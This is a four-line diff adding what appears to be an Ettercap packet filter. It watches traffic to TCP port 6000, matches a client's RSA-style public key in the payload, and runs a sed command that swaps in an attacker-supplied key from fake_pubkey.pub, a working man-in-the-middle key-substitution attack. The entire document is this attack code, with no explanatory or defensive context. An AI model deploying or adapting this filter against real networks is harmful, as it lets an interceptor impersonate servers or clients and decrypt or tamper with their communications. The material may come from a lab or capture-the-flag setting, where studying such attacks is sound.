@@ -1,0 +1,4 @@
+if (tcp.dst == 6000 && pcre_regex(DATA.data, "^[a-fA-F0-9]+:10001:[a-fA-F0-9]+\xff$")){
+		msg("Replacing client public key");
+		execreplace("/bin/sed -E s/10001:[a-fA-F0-9]+/`/bin/cat ./fake_pubkey.pub`/");
+}
